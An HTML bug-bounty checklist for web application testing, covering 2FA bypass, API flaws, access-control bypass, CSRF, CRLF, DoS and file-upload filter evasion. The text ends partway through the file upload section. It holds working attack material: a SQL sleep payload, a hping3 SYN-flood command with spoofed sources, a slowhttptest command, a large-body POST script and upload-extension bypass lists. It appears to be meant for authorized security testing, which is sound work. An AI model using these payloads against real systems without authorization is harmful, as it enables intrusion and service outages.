<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bug Hunting Checklist</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
        }
        header {
            background-color: #333;
            color: #fff;
            padding: 1em;
            text-align: center;
        }
         img {
            max-width: 100%;
            height: auto;
            display: block;
            margin: 0 auto;
        }
        main {
            padding: 2em;
        }
        .category {
            margin-bottom: 2em;
        }
        .category h3 {
            font-size: 1.5em;
            text-decoration: underline;
        }
        .subcategory h4 {
            font-size: 1.2em;
            margin-top: 1em;
            text-decoration: underline;
        }
        .steps p {
            margin: 0.5em 0;
        }
        .references p {
            margin: 0.5em 0;
        }
        input[type="checkbox"] {
            margin-right: 0.5em;
        }
        .category:nth-of-type(odd) {
            background-color: #e0e0e0;
            padding: 1em;
            border-radius: 5px;
        }
        .subcategory {
            border-left: 3px solid #333;
            padding-left: 1em;
            margin-top: 1em;
        }
        .subcategory:nth-of-type(even) {
            background-color: #f9f9f9;
        }
        .steps {
            padding-left: 2em;
        }
        .steps p {
            margin: 0.5em 0;
            padding-left: 0.5em;
            border-left: 2px dashed #333;
        }
        .references {
            margin-top: 1em;
            padding-left: 2em;
        }
        pre {
            background: #eee;
            padding: 10px;
            border-radius: 5px;
            overflow-x: auto;
        }
    </style>
</head>
<body>
    <header>
        <h1>Bug Hunting Checklist</h1>
    </header>
    <main>
     <!-- 2FA Bypass Category -->
        <div class="category">
            <h3><input type="checkbox" id="2fa-bypass">1 > 2FA Bypass</h3>
            <div class="subcategory">
                <h4><input type="checkbox" id="response-manipulation"> Response manipulation</h4>
                <div class="steps">
                    <p>1) Enter correct OTP</p>
                    <p>2) Intercept response</p>
                    <p>3) Enter wrong OTP</p>
                    <p>4) Intercept response and change it with correct response</p>
                </div>

                <h4><input type="checkbox" id="status-code-manipulation"> Status Code Manipulation</h4>
                <div class="steps">
                    <p>If Status Code is 4xx, try to change it to 200 OK and see if it bypasses restrictions</p>
                </div>

                <h4><input type="checkbox" id="direct-bypass"> Direct Bypass</h4>
                <div class="steps">
                    <p>1) Just try to access the next endpoint directly (you need to know the path of the next endpoint).</p>
                    <p>2) If this doesn't work, try to change the Referrer header as if you came from the 2FA page.</p>
                    <p>Example: site.com/login/otp_verification → site.com/login/new_password</p>
                </div>

                <h4><input type="checkbox" id="referrer-check-bypass"> Referrer Check Bypass</h4>
                <div class="steps">
                    <p>Try to navigate to the page which comes after 2FA or any other authenticated page of the application.</p>
                    <p>If there is no success, change the refer header to the 2FA page URL.</p>
                    <p>This may fool the application into pretending the request came after satisfying the 2FA condition.</p>
                </div>

                <h4><input type="checkbox" id="developers-check"> Developer’s Check</h4>
                <div class="steps">
                    <p>1) Right click on the submit button (continue or etc...)</p>
                    <p>2) Inspect element</p>
                    <p>3) Functions like “checkOTP(event)”</p>
                    <p>4) Type the function in the console</p>
                    <p><a href="https://shahjerry33.medium.com/otp-bypass-developers-check-5786885d55c6" target="_blank">Reference Link</a></p>
                </div>

                <h4><input type="checkbox" id="x-forwarded-for"> X-Forwarded-For</h4>
                <div class="steps">
                    <p>Add X-Forwarded-For: 127.0.0.1 in the request. If it does not work, try:</p>
                    <p>X-Originating-IP, X-Forwarded-Fo, X-Remote-IP, X-Remote-Addr, X-Client-IP, X-Host, X-Forwared-Host</p>
                </div>

                <h4><input type="checkbox" id="session-permission"> Session Permission</h4>
                <div class="steps">
                    <p>Using the same session, start the flow using your account and the victim's account.</p>
                    <p>When reaching the 2FA point with both accounts, complete the 2FA with your account but do not access the next part.</p>
                    <p>Instead, try to access the next step with the victim's account flow.</p>
                    <p>If the backend only sets a boolean inside your session indicating you have successfully passed the 2FA, you will be able to bypass the 2FA of the victim.</p>
                </div>

                <h4><input type="checkbox" id="reusing-token"> Reusing Token</h4>
                <div class="steps">
                    <p>Maybe you can reuse an already used token inside the account to authenticate.</p>
                </div>

                <h4><input type="checkbox" id="sharing-unused-tokens"> Sharing Unused Tokens</h4>
                <div class="steps">
                    <p>Check if you can get a token for your account and try to use it to bypass the 2FA in a different account.</p>
                </div>

                <h4><input type="checkbox" id="reveal-otp-codes"> Reveal Any Kind of OTP Codes in the Response</h4>
                <div class="steps">
                    <p>Is the token leaked in a response from the web application?</p>
                </div>

                <h4><input type="checkbox" id="otp-bypass-brute-force"> OTP Bypass by Brute Force (No Rate Limit)</h4>
                <div class="steps">
                    <p>Use Burp Suite intruder.</p>
                </div>

                <h4><input type="checkbox" id="csrf-clickjacking"> CSRF/Clickjacking</h4>
                <div class="steps">
                    <p>Check if there is a CSRF or a Clickjacking vulnerability to disable the 2FA.</p>
                </div>

                <h4><input type="checkbox" id="bypass-2fa-arbitrary-input"> Bypass 2FA Arbitrary Input</h4>
                <div class="steps">
                    <p>null, 000000, 0, ASADSas</p>
                </div>

                <h4><input type="checkbox" id="change-request-method"> Change Request Method</h4>
                <div class="steps">
                    <p>More good stuff.</p>
                </div>
            </div>
        </div>

        <!-- API Security Category -->
        <div class="category">
            <h3><input type="checkbox" id="api-security">2 >  API Security</h3>
            <div class="subcategory">
                <h4><input type="checkbox" id="31-days-api-security-testing"> 31 Days of API Security Testing</h4>
                <div class="steps">
                    <p>1) To change versions: api/v3/login → api/v1/login</p>
                    <p>2) Check other AuthN endpoints: /api/mobile/login → /api/v3/login /api/magic_link</p>
                    <p>3) Verb Tampering: GET /api/trips/1 → POST /api/trips/1 POST /api/trips DELETE /api/trips/1</p>
                    <p>4) Try Object IDs in HTTP headers and bodies, URLs tend to be less vulnerable.</p>
                    <p>5) Try Numeric IDs when facing a GUID/UUID: GET /api/users/6b95d962-df38 → GET /api/users/1</p>
                    <p>6) Wrap ID with an array: {"id":111} → {"id":[111]}</p>
                    <p>7) Wrap ID with a JSON object: {"id":111} → {"id":{"id":111}}</p>
                    <p>8) HTTP Parameter Pollution: /api/profile?user_id=legit&user_id=victim /api/profile?user_id=victim&user_id=legit</p>
                    <p>9) JSON Parameter Pollution: {"user_id":legit,"user_id":victim} {"user_id":victim,"user_id":legit}</p>
                    <p>10) Wildcard instead of ID: /api/users/1 → /api/users/* /api/users/% /api/users/_ /api/users/.</p>
                    <p>11) Ruby application HTTP parameter containing a URL → Pipe as the first character and then a shell command.</p>
                    <p>12) Developer APIs differ with mobile and web APIs. Test them separately.</p>
                    <p>13) Change Content-Type to application/xml and see if the API parses it.</p>
                    <p>14) Non-Production environments tend to be less secure (staging/qa/etc.) Leverage this fact to bypass AuthZ, AuthN, rate limiting & input validation.</p>
                    <p>15) Export Injection if you see Convert to PDF feature.</p>
                    <p>16) Expand your attack surface and test old versions of APKs/IPAs.</p>
                </div>

                <h4><input type="checkbox" id="misc"> Misc</h4>
                <div class="steps">
                    <p>Check different Content-Types</p>
                    <p>x-www-form-urlencoded → user=test</p>
                    <p>application/json → {"user": "test"}</p>
                    <p>application/xml → <user>test</user></p>
                    <p>If it's regular POST data, try sending arrays, dictionaries: username[]=John, username[$neq]=lalala</p>
                    <p>If JSON is supported, try to send unexpected data types: {"username": "John"}, {"username": true}, {"username": null}, {"username": 1}, {"username": [true]}, {"username": ["John", true]}, {"username": {"$neq": "lalala"}}</p>
                    <p>If XML is supported, check for XXE.</p>
                </div>

                <h4><input type="checkbox" id="references"> References</h4>
                <div class="references">
                    <p><a href="https://github.com/inonshk/31-days-of-API-Security-Tips" target="_blank">31 Days of API Security Tips</a></p>
                    <p><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/api-pentesting" target="_blank">API Pentesting</a></p>
                    <p><a href="https://github.com/HolyBugx/HolyTips/blob/main/Checklist/API%20Security.md" target="_blank">API Security Checklist</a></p>
                </div>
            </div>
        </div>

        <!-- Account Takeover Category -->
        <div class="category">
            <h3><input type="checkbox" id="account-takeover">3 >  Account Takeover</h3>
            <div class="subcategory">
                <h4><input type="checkbox" id="account-takeover-tip"> Account TakeOver Tip</h4>
                <div class="steps">
                    <p>Always try getting an account with a duplicate/existing email, you might end up taking over the original account.</p>
                </div>

                <h4><input type="checkbox" id="auth-bypass-signup"> Authentication Bypass Due Signup Enabled</h4>
                <div class="steps">
                    <p>Example: Target/signup.php Cross mark Target/index.php?page=signupHeavy check mark</p>
                </div>

                <h4><input type="checkbox" id="sleep-payload"> Sleep Payload</h4>
                <div class="steps">
                    <p>Example: orwa' AND (SELECT 6377 FROM (SELECT(SLEEP(5)))hLTl)--</p>
                </div>
            </div>
        </div>

        <!-- Broken Access Control Category -->
        <div class="category">
            <h3><input type="checkbox" id="broken-access-control">4 >  Broken Access Control (BAC)</h3>
            <div class="subcategory">
                <h4><input type="checkbox" id="appending-unusual-characters"> Appending Unusual Characters</h4>
                <div class="steps">
                    <p>Appending unusual characters at the end of file names can sometimes disrupt parsing logic in web applications, leading to access control bypass. Here are some common characters:</p>
                    <p>;<br>
/<br>
"<br>
'<br>
';<br>
";<br>
");<br>
');<br>
"]<br>
)]}<br>
%09<br>
%20<br>
%23<br>
%2e<br>
%2f<br>
.<br>
;<br>
..;<br>
;%09<br>
;%09..<br>
;%09..;<br>
;%2f..<br>
*<br>
                   </p>
                    <p>Example 1: Semicolon Appended to File Name</p>
                    <p>site.com/admin 403 → site.com/admin; 200</p>
                </div>

                <h4><input type="checkbox" id="parameter-pollution"> Parameter Pollution</h4>
                <div class="steps">
                    <p>Example 2: Exploiting Array Parsing Vulnerability</p>
                    <p>POST /page HTTP/1.1</p>
                    <p>Host: site.com</p>
                    <p>Content-Type: application/x-www-form-urlencoded</p>
                    <p>id[]=10</p>
                    <p>Bypass:</p>
                    <p>POST /page HTTP/1.1</p>
                    <p>Host: site.com</p>
                    <p>Content-Type: application/json</p>
                    <p>{"id": {10}}</p>
                    <p>See Parameter Pollution section for full explanation.</p>
                </div>

                <h4><input type="checkbox" id="verb-tampering"> Verb Tampering</h4>
                <div class="steps">
                    <p>HTTP Verb Tampering tests the web application’s response to different HTTP methods accessing system objects. For every system object discovered during spidering, attempt accessing all of those objects with every HTTP method.</p>
                    <p>The HTTP specification includes request methods other than the standard GET and POST requests. Standards compliant web servers may respond to these alternative methods in unexpected ways.</p>
                    <p>Try different HTTP verbs, including HEAD, TRACE, TRACK, PUT, DELETE, etc., and arbitrary strings like "JEFF".</p>
                </div>

                <h4><input type="checkbox" id="bypass-vbaac-head"> Bypassing VBAAC with HEAD</h4>
                <div class="steps">
                    <p>The HEAD request should produce the same results as a GET request but with no response body. This means you can use HEAD to bypass many VBAAC security mechanisms.</p>
                    <p>Example: http://yourcompany.com/admin/admin.jsp?fn=deleteUser</p>
                </div>

                <h4><input type="checkbox" id="bypass-vbaac-arbitrary-verbs"> Bypassing VBAAC with Arbitrary HTTP Verbs</h4>
                <div class="steps">
                    <p>Some platforms allow arbitrary HTTP verbs which execute similarly to GET requests, making it possible to bypass VBAAC implementations.</p>
                    <p>Example: Using "JEFF" method instead of "HEAD".</p>
                </div>

                <h4><input type="checkbox" id="use-http-1.0"> Use HTTP/1.0 Instead of HTTP/1.1</h4>
                <div class="steps">
                    <p>Downgrade HTTP/1.1 to HTTP/1.0 and remove all headers. This can trick some servers into misinterpreting the request.</p>
                </div>

                <h4><input type="checkbox" id="non-standard-headers"> Overriding the Request with Non-Standard Headers</h4>
                <div class="steps">
                    <p>Attempt to override requests with non-standard headers to bypass security measures. Common headers include:</p>
                    <p>X-Custom-IP-Authorization, X-Forwarded-For, X-Forward-For, X-Remote-IP, X-Originating-IP, X-Remote-Addr, X-Client-IP, X-Real-IP</p>
                    <p>Values: localhost, 127.0.0.1, 2130706433, 0x7F000001, etc.</p>
                </div>

                <h4><input type="checkbox" id="useful-tools"> Useful Tools</h4>
                <div class="steps">
                    <p>403bypassser for CLI</p>
                    <p>403-bypasser for Burp extension</p>
                </div>
            </div>
        </div>
        <!-- CRLF Category -->
        <div class="category">
            <h3><input type="checkbox" id="crlf">5 >  CRLF - Carriage Return Line Feed</h3>
            <div class="subcategory">
                <h4><input type="checkbox" id="response-splitting"> Response Splitting</h4>
                <div class="steps">
                    <p>1) XSS or Cross-Site Scripting vulnerabilities</p>
                    <p>2) Open Redirect</p>
                    <p>3) Proxy and web server cache poisoning</p>
                </div>

                <h4><input type="checkbox" id="log-injection"> Log Injection</h4>
                <div class="steps">
                    <p>1) Inject CRLF to add a new header</p>
                    <p>2) Use double CRLF to terminate HTTP headers and inject content before actual website content</p>
                </div>

                <h4><input type="checkbox" id="add-cookie"> CRLF - Add a Cookie</h4>
                <div class="steps">
                    <p>1) Try injecting cookies into the HTTP response.</p>
                </div>

                <h4><input type="checkbox" id="html-injection"> CRLF - Write HTML</h4>
                <div class="steps">
                    <p>1) Inject HTML content into the HTTP response.</p>
                </div>

                <h4><input type="checkbox" id="filter-bypass"> CRLF - Filter Bypass</h4>
                <div class="steps">
                    <p>1) Use UTF-8 encoding to bypass filters.</p>
                </div>
            </div>
        </div>

        <!-- CSRF Bypass Category -->
        <div class="category">
            <h3><input type="checkbox" id="csrf-bypass">6 >  CSRF Bypass</h3>
            <div class="subcategory">
                <h4><input type="checkbox" id="change-single-char"> 1 - Change Single Char</h4>
                <div class="steps">
                    <p>1) Attempt to change a single character in the CSRF token.</p>
                </div>

                <h4><input type="checkbox" id="empty-token"> 2 - Sending Empty Value of Token</h4>
                <div class="steps">
                    <p>1) Try sending an empty CSRF token value.</p>
                </div>

                <h4><input type="checkbox" id="replace-same-length"> 3 - Replace with Same Length</h4>
                <div class="steps">
                    <p>1) Replace the CSRF token with one of the same length.</p>
                </div>

                <h4><input type="checkbox" id="clickjacking"> 4 - Clickjacking</h4>
                <div class="steps">
                    <p>1) Test for clickjacking vulnerabilities to bypass CSRF.</p>
                </div>

                <h4><input type="checkbox" id="change-method"> 5 - Changing POST/GET Method</h4>
                <div class="steps">
                    <p>1) Change the HTTP method from POST to GET or vice versa.</p>
                </div>

                <h4><input type="checkbox" id="remove-csrf-param"> 6 - Remove CSRF Parameter from Request</h4>
                <div class="steps">
                    <p>1) Attempt to send a request without the CSRF parameter.</p>
                </div>

                <h4><input type="checkbox" id="use-another-token"> 7 - Use Another User's Valid Token</h4>
                <div class="steps">
                    <p>1) Try using a valid CSRF token from another user.</p>
                </div>

                <h4><input type="checkbox" id="referer-header"> 8 - CSRF Protection by Referer Header?</h4>
                <div class="steps">
                    <p>1) Test by removing the Referer header or adding it in the form.</p>
                </div>

                <h4><input type="checkbox" id="subdomain-bypass"> 9 - Bypass Using Subdomain</h4>
                <div class="steps">
                    <p>1) Test CSRF protection by using a subdomain like victim.com.attacker.com.</p>
                </div>

                <h4><input type="checkbox" id="decrypt-hash"> 10 - Try to Decrypt Hash</h4>
                <div class="steps">
                    <p>1) Attempt to decrypt the CSRF token if it's a hash.</p>
                </div>

                <h4><input type="checkbox" id="gmail-bypass"> 11 - Gmail Email+2 Bypass</h4>
                <div class="steps">
                    <p>1) Test sending emails to email+2@gmail.com to see if it gets delivered to email@gmail.com.</p>
                </div>

                <h4><input type="checkbox" id="xss-csrf"> 12 - CSRF Tokens Leveraging XSS Vulnerabilities</h4>
                <div class="steps">
                    <p>1) Check if CSRF tokens can be leveraged via XSS vulnerabilities.</p>
                </div>
            </div>
        </div>
        <!-- DoS Category -->
        <div class="category">
            <h3><input type="checkbox" id="dos">7 > DoS</h3>
            
            <!-- TCP SYN Flood DoS Attack -->
            <div class="subcategory">
                <h4><input type="checkbox" id="tcp-syn-flood"> TCP SYN Flood DoS Attack</h4>
                <div class="steps content">
                    <p>DoS attacks are simple to carry out, can cause serious downtime, and aren’t always obvious. In a SYN flood attack, a malicious party exploits the TCP protocol 3-way handshake to quickly cause service and network disruptions, ultimately leading to a Denial of Service (DoS) Attack. These type of attacks can easily take admins by surprise and can become challenging to identify. Luckily tools like Wireshark makes it an easy process to capture and verify any suspicions of a DoS Attack.</p>
                    
                    <h3>HOW TCP SYN FLOOD ATTACKS WORK</h3>
                    <p>When a client attempts to connect to a server using the TCP protocol e.g (HTTP or HTTPS), it is first required to perform a three-way handshake before any data is exchanged between the two. Since the three-way TCP handshake is always initiated by the client it sends a SYN packet to the server.</p>
                    <img src="https://user-images.githubusercontent.com/63053441/200159004-f6e1bddb-6629-47d5-a793-41f035a0ddfa.png" alt="TCP Handshake">
                    <p>The server next replies acknowledging the request and at the same time sends its own SYN request – this is the SYN-ACK packet. The finally the client sends an ACK packet which confirms both two hosts agree to create a connection. The connection is therefore established and data can be transferred between them.</p>
                    <p>In a SYN flood, the attacker sends a high volume of SYN packets to the server using spoofed IP addresses causing the server to send a reply (SYN-ACK) and leave its ports half-open, awaiting for a reply from a host that doesn’t exist:</p>
                    <img src="https://user-images.githubusercontent.com/63053441/200159205-2735b7d0-5540-42cb-ad1e-23f7ceba9b4c.png" alt="SYN Flood Attack">
                    <img src="https://user-images.githubusercontent.com/63053441/200159015-42f5ca86-1c89-480d-9b7a-038315764e61.png" alt="SYN Flood Example">
                    
                    <p>In a simpler, direct attack (without IP spoofing), the attacker will simply use firewall rules to discard SYN-ACK packets before they reach him. By flooding a target with SYN packets and not responding (ACK), an attacker can easily overwhelm the target’s resources. In this state, the target struggles to handle traffic which in turn will increase CPU usage and memory consumption ultimately leading to the exhaustion of its resources (CPU and RAM). At this point the server will no longer be able to serve legitimate client requests and ultimately lead to a Denial-of-Service.</p>
                    
                    <h3>How To Test TCP SYN FLOOD DOS ATTACK?</h3>
                    <p>However, to test if you can detect this type of a DoS attack, you must be able to perform one. The simplest way is via a Kali Linux and more specifically the hping3, a popular TCP penetration testing tool included in Kali Linux.</p>
                    <p>Alternatively Linux users can install hping3 in their existing Linux distribution using the command:</p>
                    <pre><code>sudo apt-get install hping3</code></pre>
                    <p>In most cases, attackers will use hping or another tool to spoof IP random addresses, so that’s what we’re going to focus on. The line below lets us start and direct the SYN flood attack to our target (192.168.1.159):</p>
                    <pre><code>hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.1.159</code></pre>
                    <img src="https://user-images.githubusercontent.com/63053441/200159063-df24f0c9-c234-4821-a2ee-0e81a7c4ddca.png" alt="hping3 Command">
                    <p>Let’s explain in detail the above command:</p>
                    <p>We’re sending 15000 packets (-c 15000) at a size of 120 bytes (-d 120) each. We’re specifying that the SYN Flag (-S) should be enabled, with a TCP window size of 64 (-w 64). To direct the attack to our victum’s HTTP web server we specify port 80 (-p 80) and use the --flood flag to send packets as fast as possible. As you’d expect, the --rand-source flag generates spoofed IP addresses to disguise the real source and avoid detection but at the same time stop the victim’s SYN-ACK reply packets from reaching the attacker.</p>
                </div>
            </div>

            <!-- Slow HTTP GET/POST Vulnerability -->
            <div class="subcategory">
                <h4><input type="checkbox" id="slow-http"> Slow HTTP GET/POST Vulnerability</h4>
                <div class="steps content">
                    <p>Slow HTTP attacks are denial-of-service (DoS) attacks that rely on the fact that the HTTP protocol, by design, requires a request to be completely received by the server before it is processed. If an HTTP request is not complete, or if the transfer rate is very low, the server keeps its resources busy waiting for the rest of the data. When the server’s concurrent connection pool reaches its maximum, this creates a denial of service. These attacks are problematic because they are easy to execute, i.e. they can be executed with minimal resources from the attacking machine.</p>
                    <pre><code>sudo apt install slowhttptest</code></pre>
                    <pre><code>slowhttptest -c 10000 -H -g -o slowhttp -i 1 -r 2000 -t GET -u https://example.com -x 2400 -p 3</code></pre>
                </div>
            </div>

            <!-- Big Entity -->
            <div class="subcategory">
                <h4><input type="checkbox" id="big-entity"> Big Entity</h4>
                <div class="steps content">
                    <p>Try sending a big request to the server. You can do it by sending a request with POST method to root with custom parameter or try in other fields like password or uploaders file name.</p>
                    
                    <h5>3.1) Python Script to Send Large File (a.txt with 50mb) as Parameter to Root Directory:</h5>
                    <pre><code>
import requests
import time

from requests.models import Response
#proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}  # If you want to see request in proxy server like Burp

session = requests.session()
f=open('a.txt','r').read()
#f=open(r'C:\Users\User\Desktop\dos\a.txt').read()   # Same to above line
burp0_url = "http://www.site.com/"
burp0_cookies = {"_ga": "GA1.2.1958363218.1640679715", "APPNNPS": "0emjb3ejnh1xxsnz025rhwvt"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0", "Accept": "text/html,application/xhtml+xml,<br>application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",<br> "Referer": "http://www.site.com/", "Upgrade-Insecure-Requests": "1"}
burp0_data = f
start = time.time()
response = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, proxies=proxies, verify=False)
print(response)
print(f'Time: {time.time() - start}')
                    </code></pre>
                    <p>If Server is processing our request for a long time and doesn't give a timeout to us, it's vulnerable.</p>
                    
                    <h5>3.2) Denial of Service Based on Comparing the Measured Response Times and Triggering a 5XX Error:</h5>
                    <p>This technique works for inputs that are not getting back in response and attacker wants to use server resources. Now most of programs don’t accept this kind of bug.</p>
                    <p>By sending a very long string (100000 characters) it’s possible to cause a denial of service attack on the server. This may lead to the website becoming unavailable or unresponsive. Usually this problem is caused by a vulnerable string hashing implementation. When a long string is sent, the string hashing process will result in CPU and memory exhaustion.</p>
                    <p>This vulnerability must be detected by sending strings with various lengths and comparing the measured response times. And you can confirm this vulnerability with 500 Internal Server Error.</p>
                    <p>The most likely field is the password because we know that it is mostly stored as a hash on the server.</p>
                    <p>By sending a very long password (1.000.000 characters) it's possible to cause a denial of service attack on the server. This may lead to the website becoming unavailable or unresponsive. Usually this problem is caused by a vulnerable password hashing implementation. When a long password is sent, the password hashing process will result in CPU and memory exhaustion.</p>
                    
                    <p>You can find this at many places like:</p>
                    <ul>
                        <li>Username</li>
                        <li>Firstname or Lastname</li>
                        <li>Email Address (create your own email using temp-mail)</li>
                        <li>Address</li>
                        <li>Text-Area</li>
                        <li>Comment Section</li>
                    </ul>
                    
                    <h5>Remediation:</h5>
                    <ul>
                        <li>The password hashing implementation must be fixed to limit the maximum length of accepted passwords.</li>
                        <li>As in most systems there is a policy for the minimum number of characters, this limit should also exist for the maximum number of characters.</li>
                    </ul>
                    
                    <h5>How to Find This Vulnerability:</h5>
                    <ol>
                        <li>Go to <a href="https://privateprogram.com/signup" target="_blank">https://privateprogram.com/signup</a></li>
                        <li>Fill the form and enter a long string in password</li>
                        <li>Click on enter and you’ll get 500 Internal Server error if it is vulnerable:</li>
                    </ol>
                    <img src="https://user-images.githubusercontent.com/63053441/200264593-ec1cfb7c-2f1b-4c5d-9701-65d2c3e0beed.png" alt="500 Internal Server Error">
                    
                    <h5>NOTES:</h5>
                    <ul>
                        <li>Also you must check that you can login in program with that long password or not! (Is that password accepted from server?)</li>
                        <li>Now many a times it happens that the signup page is not vulnerable to Long String Dos so you can try it while resetting your password.</li>
                        <li>This DoS attack falls under the Application Level DoS and not Network Level DoS so you can report it. In some company’s policy of Out-Of-Scope, you’ll find “Denial of Service” which means Network Level DoS and not Application Level DoS. If the company has stated that “Any kind of DoS” is Out-Of-Scope that means you can’t report either of them.</li>
                    </ul>
                    
                    <h5>HackerOne Reports:</h5>
                    <ul>
                        <li><a href="https://hackerone.com/reports/223854" target="_blank">https://hackerone.com/reports/223854</a></li>
                        <li><a href="https://hackerone.com/reports/768677" target="_blank">https://hackerone.com/reports/768677</a></li>
                        <li><a href="https://hackerone.com/reports/819088" target="_blank">https://hackerone.com/reports/819088</a></li>
                    </ul>
                    
                    <h5>3.3) Denial of Service Based on Humongous Long String in Response:</h5>
                    <p>Checking the existence of this vulnerability is the same as the previous methods. You should be able to send a large data to the server, but with the difference that this time you are not only looking for error 500 or an increase in data processing time, rather you are looking for an endpoint that executes your data and returns it in response. If this data is visible to a larger number of users, the impact of the vulnerability increases.</p>
                    <p>For example, if the file name you upload in a forum is several thousand characters long and when other users opened that particular page they are forced to request the file name from the server, you have found a vulnerability that leads to restrict the access to that page.</p>
                    <p>As it is known in this <a href="https://hackerone.com/reports/764434" target="_blank">report</a>, by placing the payload in the file name, the hacker caused problems for other users who requested a query to load the profile picture and their browser crashed. <a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/DOS/payload.txt" target="_blank">Payload Link with 3mg Size</a></p>
                </div>
            </div>

            <!-- Pixel Flood/Frame Flood Attack -->
            <div class="subcategory">
                <h4><input type="checkbox" id="pixel-frame-flood"> Pixel Flood/Frame Flood Attack</h4>
                <div class="steps content">
                    <p>There are many ways to create a Denial-Of-Service attack but most of them end up as Informative or N/A. So there is an effective technique in which an image is uploaded in the profile photo that has the maximum pixel size of 64250px and gives you the time out, creating a DoS.</p>
                    <p>The vulnerable application will load the pixel from the image file to the memory, and process the image in order to get a new image file such as resize, rotate, blur, etc. The attacker could manipulate the exif data in the image file such as change the image pixel to 64250 * 64250 pixels. If the vulnerable application loaded the crafted image, it tries to allocate 4128062500 pixels into memory.</p>
                    <h5>How to Find This Vulnerability:</h5>
                    <ol>
                        <li>Go to your target website and upload a profile photo</li>
                        <li>The photo should have the pixel size of 64250*64250px (height and width)</li>
                        <li>Select the file and upload it</li>
                        <li>After uploading just check the response you’ll get a timeout error</li>
                    </ol>
                    <img src="https://user-images.githubusercontent.com/63053441/200397507-fc8b543f-a424-4014-b50a-75e5985f3288.png" alt="Pixel Flood Attack">
                    <p>Here the service is trying to convert the image once uploaded, by loading the 'whole image' into memory. It tries to allocate 4128062500 pixels into memory, flooding the memory and causing DoS.</p>
                    <p>Also, you can confirm this vulnerability with two accounts:</p>
                    <ul>
                        <li>From Account 1 try to send 64K * 64K resolution image</li>
                        <li>Simultaneously from Account 2 try to send normal image (with different Internet Connection).</li>
                        <li>You should see that the process of uploading with the account 2 is smooth (E.g got 502)</li>
                    </ul>
                    <p>In some cases, the website doesn’t allow you to upload the 64250*64250px images due to security, so you need to bypass it. Bypassing is very simple just replace the "64250*64250px" value with 0xfafa * 0xfafa this is equivalent to 64250 in Decimal number system and its binary format is 1111101011111010.</p>
                    <p>You can make your own image <a href="https://www.resizepixel.com/" target="_blank">here</a> or download a crafted image from the attachment <a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/raw/main/DOS/lottapixel.jpg" target="_blank">lottapixel.jpg</a></p>
                    <h5>Remediation:</h5>
                    <ul>
                        <li>Just set a maximum amount of pixels an image can have and check it before any processing.</li>
                        <li>Instructing to run validations before starting the resizing or any process.</li>
                    </ul>
                    <h5>HackerOne Reports:</h5>
                    <ul>
                        <li><a href="https://hackerone.com/reports/390" target="_blank">https://hackerone.com/reports/390</a></li>
                        <li><a href="https://hackerone.com/reports/400" target="_blank">https://hackerone.com/reports/400</a></li>
                        <li><a href="https://hackerone.com/reports/842462" target="_blank">https://hackerone.com/reports/842462</a></li>
                    </ul>
                </div>
            </div>

            <!-- Cookie Bomb -->
            <div class="subcategory">
                <h4><input type="checkbox" id="cookie-bomb"> Cookie Bomb</h4>
                <div class="steps content">
                    <pre><code class="language-php">
https://target.com/index.php?param1=xxxxxxxxxxxxxx
                    </code></pre>
                    <p>After input "xxxxxxxxxxxxxx" as a value of param1, check your cookies. If there are cookies the value is "xxxxxxxxxxxxxxxxxxxxxx" it means the website is vulnerable.</p>
                    <p>Try input a very long payload to form. For example using a very long password or using a very long email:</p>
                    <pre><code class="language-php">
POST /register HTTP/1.1
Host: target.com
...

username=victim&password=aaaaaaaaaaaaaaa
                    </code></pre>
                    <h5>References:</h5>
                    <ul>
                        <li><a href="https://www.acunetix.com/vulnerabilities/web/long-password-denial-of-service/" target="_blank">https://www.acunetix.com/vulnerabilities/web/long-password-denial-of-service/</a></li>
                        <li><a href="https://shahjerry33.medium.com/long-string-dos-6ba8ceab3aa0" target="_blank">https://shahjerry33.medium.com/long-string-dos-6ba8ceab3aa0</a></li>
                        <li><a href="https://cwe.mitre.org/data/definitions/400.html" target="_blank">https://cwe.mitre.org/data/definitions/400.html</a></li>
                        <li><a href="https://www.firewall.cx/" target="_blank">https://www.firewall.cx/</a></li>
                        <li><a href="https://shahjerry33.medium.com/dos-mr-pixel-flood-27605add29f2" target="_blank">https://shahjerry33.medium.com/dos-mr-pixel-flood-27605add29f2</a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
    <!-- File Upload Category -->
        <div class="category">
            <h3><input type="checkbox" id="file-upload">8 > File Upload</h3>
            <div class="subcategory">
                <h4><input type="checkbox" id="upload-function"> Upload Function</h4>
                <div class="steps">
                    <p><strong>Extensions Impact:</strong></p>
                    <p>ASP, ASPX, PHP5, PHP, PHP3: Webshell, RCE</p>
                    <p>SVG: Stored XSS, SSRF, XXE</p>
                    <p>GIF: Stored XSS, SSRF</p>
                    <p>CSV: CSV injection</p>
                    <p>XML: XXE</p>
                    <p>AVI: LFI, SSRF</p>
                    <p>HTML, JS: HTML injection, XSS, Open redirect</p>
                    <p>PNG, JPEG: Pixel flood attack (DoS)</p>
                    <p>ZIP: RCE via LFI, DoS</p>
                    <p>PDF, PPTX: SSRF, BLIND XXE</p>
                </div>

                <h4><input type="checkbox" id="blacklisting-bypass"> Blacklisting Bypass</h4>
                <div class="steps">
                    <p>PHP → .phtm, .phtml, .phps, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .pgif, .inc</p>
                    <p>ASP → asp, .aspx, .cer, .asa</p>
                    <p>Jsp → .jsp, .jspx, .jsw, .jsv, .jspf</p>
                    <p>Coldfusion → .cfm, .cfml, .cfc, .dbm</p>
                    <p>Using random capitalization → .pHp, .pHP5, .PhAr</p>
                </div>

                <h4><input type="checkbox" id="whitelisting-bypass"> Whitelisting Bypass</h4>
                <div class="steps">
                    <p>file.jpg.php</p>
                    <p>file.php.jpg</p>
                    <p>file.php.blah123jpg</p>
